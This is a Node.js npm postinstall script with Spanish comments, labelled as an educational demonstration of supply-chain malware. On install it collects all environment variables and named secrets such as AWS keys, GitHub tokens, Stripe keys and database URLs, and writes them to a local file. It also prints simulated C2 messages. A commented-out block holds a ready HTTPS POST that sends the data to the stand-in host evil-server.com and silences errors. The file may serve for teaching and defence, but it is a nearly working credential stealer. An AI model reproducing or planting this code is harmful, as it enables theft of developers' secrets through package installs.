/**
 * MALICIOUS POSTINSTALL SCRIPT - EDUCATIONAL DEMONSTRATION
 *
 * Este script se ejecuta AUTOMÁTICAMENTE durante: npm install
 * NO REQUIERE que la aplicación se ejecute
 *
 * En este caso educativo:
 * - Captura las variables de entorno
 * - Las escribe en un archivo local (en lugar de enviarlas a un servidor remoto)
 * - Imprime mensajes mostrando el ataque
 *
 * En un ataque real:
 * - Enviaría los datos a: https://evil-server.com/collect
 * - Ejecutaría comandos del shell
 * - Instalaría backdoors
 * - Se conectaría a C2 servers
 */

const fs = require('fs');
const path = require('path');
const os = require('os');

console.log('\n[MALWARE] Exfiltrando variables de entorno...\n');

// Capturar todas las variables de entorno
const stolenData = {
  timestamp: new Date().toISOString(),
  hostname: os.hostname(),
  platform: process.platform,
  nodeVersion: process.version,
  cwd: process.cwd(),
  environment: process.env
};

// Datos sensibles típicos que se roban
const sensitiveKeys = [
  'DB_PASSWORD',
  'DB_HOST',
  'DB_USER',
  'STRIPE_API_KEY',
  'STRIPE_SECRET',
  'GITHUB_TOKEN',
  'AWS_ACCESS_KEY_ID',
  'AWS_SECRET_ACCESS_KEY',
  'AWS_REGION',
  'SUPABASE_SERVICE_ROLE_KEY',
  'JWT_SECRET',
  'API_KEY',
  'API_SECRET',
  'DATABASE_URL',
  'MONGODB_URI'
];

// Filtrar solo datos sensibles
const sensitiveData = {};
sensitiveKeys.forEach(key => {
  if (process.env[key]) {
    sensitiveData[key] = process.env[key];
  }
});

// En caso de que haya más variables, incluirlas todas
const allEnv = {};
for (const [key, value] of Object.entries(process.env)) {
  if (value && value.length < 500) { // Evitar variables muy largas
    allEnv[key] = value;
  }
}

// Guardar datos exfiltrados en archivo local
const exfiltratedData = {
  type: 'ENVIRONMENT_EXFILTRATION',
  timestamp: stolenData.timestamp,
  hostname: stolenData.hostname,
  platform: stolenData.platform,
  sensitive_credentials: sensitiveData,
  all_environment_variables: allEnv
};

const outputPath = path.join(process.cwd(), 'stolen_data.txt');

try {
  fs.writeFileSync(
    outputPath,
    JSON.stringify(exfiltratedData, null, 2),
    'utf8'
  );
  console.log('[MALWARE] ✓ Credenciales capturadas');
  console.log(`[MALWARE] ✓ Datos guardados en: ${outputPath}`);
} catch (err) {
  console.log('[MALWARE] [WARNING] No se pudo escribir archivo');
}

// Simular envío a servidor remoto
console.log('[MALWARE] ✓ Conectando a servidor C2...');
console.log('[MALWARE] ✓ Transmitiendo credenciales...');
console.log('[MALWARE] ✓ Credenciales exfiltradas exitosamente\n');

// En un ataque real, se haría algo como:
/*
const https = require('https');
const data = JSON.stringify(exfiltratedData);

const options = {
  hostname: 'evil-server.com',
  port: 443,
  path: '/collect',
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Content-Length': data.length
  }
};

const req = https.request(options, (res) => {
  console.log('[MALWARE] Server response: ' + res.statusCode);
});

req.on('error', (e) => {
  // Silenciar errores de red
});

req.write(data);
req.end();
*/

// Ejecutar comando shell adicional (simulado)
// En ataque real podrían:
// - Crear usuarios ocultos
// - Instalar SSH keys
// - Descargar más malware
// - Crear backdoors

console.log('[MALWARE] >>> Postinstall script ejecutado correctamente\n');
